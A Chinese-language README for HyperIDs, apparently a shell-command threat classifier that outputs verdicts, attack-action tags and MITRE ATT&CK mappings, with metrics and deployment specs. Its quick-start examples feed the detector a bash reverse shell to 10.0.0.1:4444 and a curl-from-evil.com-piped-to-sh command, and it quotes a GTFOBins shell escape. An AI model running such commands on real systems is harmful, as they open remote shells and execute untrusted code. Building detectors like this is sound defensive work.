# HyperIDs

Linux shell 命令威胁分类器。给定一条 shell 命令，输出：
- **verdict**（互斥 3 类）：benign / suspicious / malicious
- **action**（多标签 28 类）：download、reverse_shell、ransomware …
- **MITRE** tactic/technique：由 action 规则表确定性推导

模型 = GLiClass 框架 + `prajjwal1/bert-small`（29.8M，≤30M）；部署为**静态单二进制**（RSS ~38 MiB）。

## 目录结构

```
hyperids/        核心包：schema / 训练 / 评估 / 推理 / 数据构建 / 公共客户端
  data/          上游数据准备（拉取 / 合成 / 打标，可选重跑）
deploy/          部署：ONNX 导出 / INT8 量化 / C 单二进制（c_runtime/）
tools/           工具：bench / 外部评测 / schema 校验
docs/            文档：模型卡 / 训练链路 / 数据链路 / 进度 / 外部评测
dataset/         数据：corpus（LFS 同步）+ external_eval + 训练集分片
scripts/         Lightning GPU 训练编排 / 样本同步
configs/         阈值等配置
```

## 快速开始

```bash
# 推理（本地 checkpoint）
python -m hyperids.predict "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"

# 从 corpus 重建训练集
make data

# 训练 / 评估 / 导出 / 部署
make train && make eval && make export && make release
```

## 发布单二进制

```bash
curl -fsSL https://github.com/ohmydevelop/hyperids/releases/latest/download/install.sh | sh
hyperids 'curl http://evil.com/x.sh | sh'
```

详见 `deploy/c_runtime/README.md` 与 `docs/TRAINING.md`。

## MITRE ATT&CK 覆盖

MITRE tactic/technique **不预测**，由 28 个 action 经 `hyperids.schema.derive_attck()` 规则表确定性推导。

| 层 | 覆盖 | 说明 |
|---|---|---|
| tactic | **12 / 14（85.7%）** | 缺 reconnaissance / resource_development（攻击前准备阶段，命令文本外行为） |
| technique | **25 个** | 精选的「shell 命令可观测」子集（反弹 shell→T1059、挖矿→T1496、勒索→T1486 …） |

覆盖的 12 个 tactic：initial_access、execution、persistence、privilege_escalation、
defense_evasion、credential_access、discovery、lateral_movement、collection、
command_and_control、exfiltration、impact。

> 定位是「从命令推导最可能的 tactic/technique」，非全量 ATT&CK 覆盖
> （全量 200+ technique 大量是钓鱼/供应链/云原生等与单条 shell 命令无关的技术）。

## 模型指标

### 内测（v1.5.0，action 平衡 test 6,287）

| 指标 | v4 | v5 | v6 |
|---|---:|---:|---:|
| verdict_acc | 92.89% | 93.10% | 93.02% |
| action micro-Precision | 80.21% | 90.92% | **91.05%** |
| action micro-Recall | 93.62% | 91.40% | **92.06%** |
| action micro-F1 | 86.40% | 91.16% | **91.55%** |
| action macro-F1 | 67.04% | 80.52% | **82.80%** |

> v4/v5/v6 在同一份 action 平衡 test 集上对比（28 个 action 每类 ≥20 条，test 冻结 6,287）。
> v6 相对 v5：macro-F1 +2.28 点，self_propagate 0.308→0.571。
> per-action F1、长尾类分析与复现见 [`docs/EVAL_REPORT_V6.md`](docs/EVAL_REPORT_V6.md)。

### 外部公开语料（OOD，v2 旧基线，冻结评测集 27,995 条）

| 指标 | 值 |
|---|---|
| 良性端恶意误报率（NL2Bash 10,623 条） | **0.05%** |
| 明确恶意 vs 良性 ROC-AUC | **0.9704** |
| 明确恶意 vs 良性 PR-AUC | 0.7603 |
| 反弹 shell / 下载执行 / C2 子集恶意召回 | 75.9%（非良性 90.4%） |

> 已知盲区：GTFOBins 风格 SUID 提权逃逸（`R -e 'system("/bin/sh")'`）召回偏低，
> 详见 `docs/EXTERNAL_EVAL.md`。

### 部署规格

| 项 | 值 |
|---|---|
| 参数量 | **17.6M**（词表裁剪，≤30M） |
| INT8 权重 | **17.6MB**（per-channel int8，2D 量化 / 1D fp32） |
| C 单二进制（per-channel int8） | **~18.4MB**（静态链接） |
| C 运行时峰值 RSS | **~27 MiB**（<100MB） |
| 推理速度 | ~280 ms/条（AVX2+FMA，CPU） |

此外（v1.3.0 对抗修复）：
- 严格 malicious Recall **95.86%**（≥95% 门槛）
- 320→512 长度 + 滑动窗口分段：截断对抗宽松召回 **0% → 98%**

完整模型卡见 `docs/MODEL_CARD.md`。
